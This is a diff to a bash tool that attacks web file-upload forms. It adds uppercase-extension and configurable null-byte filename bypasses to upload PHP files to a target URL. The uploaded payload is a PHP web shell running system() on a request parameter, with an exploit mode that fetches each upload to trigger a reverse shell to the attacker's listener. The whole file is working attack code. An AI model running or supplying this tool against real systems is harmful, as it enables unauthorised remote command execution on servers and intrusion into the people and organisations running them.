@@ -11,6 +11,7 @@ Help()
 	echo -e "-u <URL>: The target URL that's used in POST Requests to upload a file\n\n"
 	echo -e "-n <NAME>: The 'name' attribute that's used in POST Requests (e.g. file for name=\"file\")\n\n"
 	echo -e "-e <URL>: Exploit mode. Attempts to automatically trigger a Reverse Shell. Enter the URL where uploaded files are saved to.\n\n"
+	echo -e "-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.\n\n"
 	echo -e "-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e"
 
 }
@@ -20,7 +21,7 @@ then
         echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
 
 else
-	while getopts ":hi:p:u:n:e:b" option; do
+	while getopts ":hi:p:u:n:e:a:b" option; do
         	case $option in
 			h)
                         	Help
@@ -41,6 +42,9 @@ else
 			e)
 				exploit=$OPTARG
 				;;
+			a)
+				allowed=$OPTARG
+				;;
 			b)
 #				payload='<?php if(isset($_REQUEST['"'"'0'"'"'])){echo "<pre>"; system($_REQUEST['"'"'0'"'"']); echo "</pre>"; die;} ?>'
 				payload='<?php if(isset($_REQUEST["0"])){echo "<pre>"; system($_REQUEST["0"]); echo "</pre>"; die;} ?>'
@@ -55,6 +59,9 @@ else
 
 fi
 
+submit_field="submit"
+submit_value="Upload"
+
 if [[ -z "$url" ]]
 then
 	echo -e "\nEnter the target URL:\n"
@@ -67,9 +74,6 @@ then
 	read form_field
 fi
 
-submit_field="submit"
-submit_value="Upload"
-
 if [[ -z "$ip" ]]
 then
 	echo -e "\nEnter your IP Address:\n"
@@ -80,6 +84,11 @@ if [[ -z "$port" ]]
 then
 	echo -e "\nEnter your listner's port:\n"
 	read port
+fi
+
+if [[ -z "$allowed" ]]
+then
+	allowed="jpg"
 fi
 
 # PHP payload to send as the file content
@@ -119,25 +128,59 @@ EOF
 # Upload with normal extensions
 for ext in "${extensions[@]}"; do
 	filename="testfile.$ext"
-	upload_file "$filename"
+	upload_file "$filename"	
+	echo -e "$line"
+
+	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+	filename="testfile.$ext_upper"
+	upload_file "$filename"	
 	echo -e "$line"
 done
 
 # Upload with null byte appended (percent-encoded %00)
 for ext in "${extensions[@]}"; do
-	filename="testfile.$ext%00.jpg"
+	filename="testfile.$ext%00.$allowed"
 	upload_file "$filename"
+	echo -e "$line"
+
+	ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+	filename="testfile.$ext_upper%00.$allowed"
+	upload_file "$filename"	
 	echo -e "$line"
 done
 
 if [[ -n "$exploit" ]]
 then
 	for ext in "${extensions[@]}"; do
-		filename="testfile.$ext"
 		exploit="${exploit%/}"
+		
+		filename="testfile.$ext"
 		evil="$exploit"/"$filename"
 		echo -e "$line\n[*] Visiting: $evil\n"
 		curl $evil
+		echo -e "$line"
+
+		ext_upper=$(echo -n "$ext" | tr '[:lower:]' '[:upper:]')
+		filename="testfile.$ext_upper"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+		filename="testfile.$ext%00.$allowed"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+		filename="testfile.$ext_upper%00.$allowed"
+		evil="$exploit"/"$filename"
+		echo -e "$line\n[*] Visiting: $evil\n"
+		curl $evil
+		echo -e "$line"
+
+
+
 	done
 else
 	exit 0
